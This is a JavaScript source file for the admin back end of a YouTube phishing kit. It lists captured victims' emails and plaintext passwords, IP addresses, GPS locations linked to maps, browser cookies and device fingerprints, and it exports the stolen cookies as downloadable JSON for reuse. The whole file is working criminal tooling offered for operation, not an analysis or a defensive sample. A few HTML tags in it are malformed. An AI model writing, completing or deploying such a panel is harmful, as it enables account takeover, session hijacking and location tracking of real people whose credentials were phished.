// api/retrieve.js — Admin panel for YouTube captures
// Access: /admin?key=YOUR_SECRET

const UPSTASH_URL = process.env.KV_REST_API_URL;
const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
const KV_PREFIX = "coffee-fence";
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || "change-me";

export default async function handler(req, res) {
    res.setHeader('Content-Type', 'text/html');

    const accessKey = req.query.key;
    if (!accessKey || accessKey !== ADMIN_KEY) {
        return res.status(401).send('<h1>Unauthorized</h1>');
    }

    const action = req.query.action || 'list';

    if (action === 'list') return await showList(req, res);
    if (action === 'stats') return await showStats(req, res);
    if (action === 'export') return await exportCookies(req, res);
    if (action === 'clear') return await clearData(req, res);

    return res.send(`
        <h1>YouTube Phish Admin</h1>
        <ul>
            <li><a href="?key=${accessKey}&action=list">View Captured Data</a></li>
            li><a href="?key=${accessKey}&action=stats">Statistics</a></li>
            li><a href="?key=${accessKey}&action=export">Export Cookies (JSON)</a></li>
            <li><a href="?key=${accessKey}&action=clear" onclick="return confirm('Delete ALL?')">Clear All Data</a></li>
        </ul>
    `);
}

async function showList(req, res) {
    try {
        const result = await upstashGet(`${KV_PREFIX}:youtube_entries`);
        let entries = [];
        if (result.result) {
            try { entries = JSON.parse(result.result); } catch(e) {}
        }
        if (!Array.isArray(entries)) entries = [];

        let html = `
        <!DOCTYPE html>html><head>
        <title>YouTube Captures</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width">
        <style>
            * { box-sizing:border-box; margin:0; padding:0; }
            body { font-family:-apple-system,sans-serif; background:#f5f5f5; padding:20px; }
            h1 { color:#333; margin-bottom:10px; }
            .count { color:#666; margin-bottom:20px; }
            .nav { margin-bottom:20px; }
            .nav a { color:#1a73e8; text-decoration:none; margin-right:15px; font-size:14px; }
            .nav a:hover { text-decoration:underline; }
            table { width:100%; border-collapse:collapse; background:#fff; box-shadow:0 1px 4px rgba(0,0,0,0.1); border-radius:8px; overflow:hidden; }
            th { background:#FF0000; color:white; padding:12px 10px; text-align:left; font-size:13px; }
            td { padding:10px; border-bottom:1px solid #eee; font-size:13px; vertical-align:top; }
            tr:hover { background:#fff5f5; }
            .map-link { color:#1a73e8; text-decoration:none; }
            .map-link:hover { text-decoration:underline; }
            .cookie-data { max-width:300px; word-break:break-all; font-size:11px; color:#666; }
            .badge { display:inline-block; padding:2px 8px; border-radius:10px; font-size:11px; font-weight:600; }
            .badge.cookies { background:#e8f5e9; color:#2e7d32; }
            .badge.nocookies { background:#fce4ec; color:#c62828; }
            details { cursor:pointer; }
            details summary { color:#1a73e8; font-weight:500; }
        </style>
        </head><body>
            <div class="nav">
                <a href="?key=${req.query.key}">Home</a>
                <a href="?key=${req.query.key}&action=stats">Stats</a>
                <a href="?key=${req.query.key}&action=export" target="_blank">Export Cookies</a>
                <a href="?key=${req.query.key}&action=clear" onclick="return confirm('Delete ALL?')">Clear All</a>
            </div>
            <h1>YouTube Captured Credentials</h1>
            <div class="count">Total: <strong>${entries.length}</strong> captures</div>
            <table>
                <tr>
                    <th>#</th>
                    <th>Time</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP</th>
                    <th>Location</th>
                    <th>Map</th>
                    <th>Cookies</th>
                    <th>Device</th>
                </tr>`;

        entries.forEach((e, i) => {
            const lat = e.location?.lat ?? '-';
            const lon = e.location?.lon ?? '-';
            const mapLink = (lat !== '-' && lon !== '-') 
                ? `<a class="map-link" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">📍</a>`
                : '-';
            const cookieCount = e.cookies?.count ?? 0;
            const cookieBadge = cookieCount > 0 
                ? `<span class="badge cookies">${cookieCount} cookies</span>`
                : `<span class="badge nocookies">0</span>`;
            
            const deviceInfo = e.device ? `
                <details>
                    <summary>View</summary>
                    <small>
                        ${e.device.platform || '-'} | 
                        ${e.device.screenWidth}x${e.device.screenHeight} |
                        GPU: ${e.device.gpuVendor?.renderer?.substring(0,40) || '-'} |
                        RAM: ${e.device.deviceMemory || '?'}GB |
                        CPU: ${e.device.hardwareConcurrency || '?'} cores |
                        ${e.device.connection?.effectiveType || ''}
                    </small>
                </details>` : '-';

            const cookiesHtml = e.cookies?.raw ? `
                <details>
                    <summary>${cookieBadge}</summary>
                    <div class="cookie-data">${escapeHtml(e.cookies.raw.substring(0,500))}</div>
                </details>` : cookieBadge;

            html += `<tr>
                <td>${i+1}</td>
                <td>${new Date(e.timestamp).toLocaleString()}</td>
                <td><strong>${escapeHtml(e.email)}</strong></td>
                <td><code>${escapeHtml(e.password)}</code></td>
                <td>${escapeHtml(e.ip?.ip || '-')}</td>
                <td>${lat}, ${lon}</td>
                <td>${mapLink}</td>
                <td>${cookiesHtml}</td>
                <td>${deviceInfo}</td>
            </tr>`;
        });

        html += `</table></body></html>`;
        res.send(html);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function showStats(req, res) {
    try {
        const countResult = await upstashGet(`${KV_PREFIX}:youtube_total`);
        const count = countResult.result || '0';
        res.send(`
            <!DOCTYPE html><html><head><title>Stats</title>
            <style>
                body { font-family:-apple-system,sans-serif; padding:40px; background:#f5f5f5; }
                .card { background:white; padding:30px; border-radius:8px; box-shadow:0 1px 4px rgba(0,0,0,0.1); max-width:400px; }
                h1 { color:#333; }
                .num { font-size:48px; color:#FF0000; font-weight:bold; }
                .nav { margin-bottom:20px; }
                .nav a { color:#1a73e8; text-decoration:none; margin-right:15px; }
            </style>
            </head><body>
                <div class="card">
                    <div class="nav"><a href="?key=${req.query.key}&action=list">Back</a></div>
                    <h1>YouTube Capture Stats</h1>
                    <p>Total captures:</p>
                    <div class="num">${count}</div>
                </div>
            </body></html>
        `);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function exportCookies(req, res) {
    // Export all captured cookies as downloadable JSON
    try {
        const result = await upstashGet(`${KV_PREFIX}:youtube_entries`);
        let entries = [];
        if (result.result) {
            try { entries = JSON.parse(result.result); } catch(e) {}
        }
        if (!Array.isArray(entries)) entries = [];

        const cookieExports = entries
            .filter(e => e.cookies && e.cookies.raw)
            .map(e => ({
                captured_at: e.timestamp,
                email: e.email,
                ip: e.ip?.ip,
                location: e.location ? `${e.location.lat},${e.location.lon}` : null,
                cookies_raw: e.cookies.raw,
                cookies_parsed: e.cookies.parsed,
                cookie_count: e.cookies.count,
                user_agent: e.device?.userAgent,
                platform: e.device?.platform
            }));

        const jsonStr = JSON.stringify(cookieExports, null, 2);
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename="youtube_cookies_export_${Date.now()}.json"`);
        res.send(jsonStr);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function clearData(req, res) {
    try {
        await upstashDel(`${KV_PREFIX}:youtube_entries`);
        await upstashSet(`${KV_PREFIX}:youtube_total`, '"0"');
        res.send(`<h1>Cleared</h1><p>All YouTube capture data deleted.</p><a href="?key=${req.query.key}">Back</a>`);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function upstashGet(key) {
    const url = `${UPSTASH_URL}/get/${encodeURIComponent(key)}`;
    const resp = await fetch(url, { headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` } });
    return resp.json();
}

async function upstashSet(key, value) {
    const url = `${UPSTASH_URL}/set/${encodeURIComponent(key)}`;
    await fetch(url, { method: 'POST', headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}`, 'Content-Type': 'application/json' }, body: JSON.stringify(value) });
}

async function upstashDel(key) {
    const url = `${UPSTASH_URL}/del/${encodeURIComponent(key)}`;
    await fetch(url, { method: 'POST', headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` } });
}

async function upstashIncr(key) {
    const url = `${UPSTASH_URL}/incr/${encodeURIComponent(key)}`;
    await fetch(url, { method: 'POST', headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` } });
}

function escapeHtml(str) {
    if (typeof str !== 'string') return str;
    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
